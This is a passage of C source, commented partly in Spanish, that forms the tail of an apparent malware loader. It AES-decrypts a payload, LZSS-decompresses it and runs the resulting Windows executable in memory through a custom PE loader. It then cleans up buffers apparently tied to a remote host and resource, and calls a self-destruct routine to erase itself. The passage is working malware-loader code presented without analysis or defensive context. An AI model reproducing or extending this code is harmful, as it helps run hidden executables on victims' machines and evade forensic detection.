    DWORD decryptedLen = cipherLen;
    DecryptAES(cipher, &decryptedLen, key, keyLen);

    // Descomprimir
    unsigned char* decompressed = NULL;
    size_t decompSize = 0;
    if (!lzss_decode_mem((unsigned char*)cipher, decryptedLen, &decompressed, &decompSize)) {
        log("[-] LZSS decompression failed");
        goto cleanup;
    }

    log("[+] LZSS: %zu -> PE: %zu (expected: %u)", decryptedLen, decompSize, peOriginalSize);

    // Cargar y ejecutar PE
    PELoader((char*)decompressed, (DWORD)decompSize);
    log("\n[+] End");

cleanup:
    free(whost);
    free(wresource);
    if (payload.data) free(payload.data);
    if (decompressed) free(decompressed);
    Sleep(3000);
    selfDestruct();
    return 0;

invalid:
    log("[-] Invalid payload format");
    goto cleanup;
}
